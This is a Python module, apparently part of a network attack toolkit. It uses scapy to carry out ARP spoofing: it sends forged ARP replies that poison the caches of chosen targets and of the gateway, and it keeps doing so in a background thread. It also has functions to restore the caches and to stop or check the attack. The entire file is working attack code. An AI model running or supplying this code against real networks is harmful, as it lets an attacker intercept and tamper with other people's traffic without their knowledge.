import time
import threading
from scapy.all import ARP, send
from network_scanner import get_mac

_spoof_thread = None
_stop_event = threading.Event()


def arp_spoof(target_ip, spoof_ip):
    #target_ip, spoof_ip = input("# Target ip >"), input("# Spoof ip > ")
    target_mac = get_mac(target_ip)
    if target_mac:
        arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(arp_response, verbose=False)

def restore_arp(target_ip, spoof_ip):
    #target_ip, spoof_ip=input("# Target ip >"),input("# Spoof ip > ")
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    if target_mac and spoof_mac:
        arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
        send(arp_response, count=4, verbose=False)

def arp_spoof_attack(target_ips, gateway_ip):
    """
    target_ips: str или list[str] — IP-адрес(а) цели
    gateway_ip: str — IP-адрес шлюза
    """
    if isinstance(target_ips, str):
        target_ips = [target_ips]
    print(f"[*] Starting ARP spoofing attack on targets: {target_ips} and gateway: {gateway_ip}")
    _stop_event.clear()
    while not _stop_event.is_set():
        for target_ip in target_ips:
            arp_spoof(target_ip, gateway_ip)
            arp_spoof(gateway_ip, target_ip)
        _stop_event.wait(2)


def start_arp_spoof_thread(target_ips, gateway_ip):
    """Запускает ARP-спуфинг в фоновом потоке. Возвращает объект потока."""
    global _spoof_thread
    _stop_event.clear()
    _spoof_thread = threading.Thread(
        target=arp_spoof_attack,
        args=(target_ips, gateway_ip),
        daemon=True,
    )
    _spoof_thread.start()
    return _spoof_thread


def stop_arp_spoof_thread():
    """Останавливает фоновый поток ARP-спуфинга."""
    global _spoof_thread
    _stop_event.set()
    if _spoof_thread and _spoof_thread.is_alive():
        _spoof_thread.join(timeout=5)
    _spoof_thread = None


def is_arp_spoofing():
    """Возвращает True, если ARP-спуфинг активен."""
    return _spoof_thread is not None and _spoof_thread.is_alive()
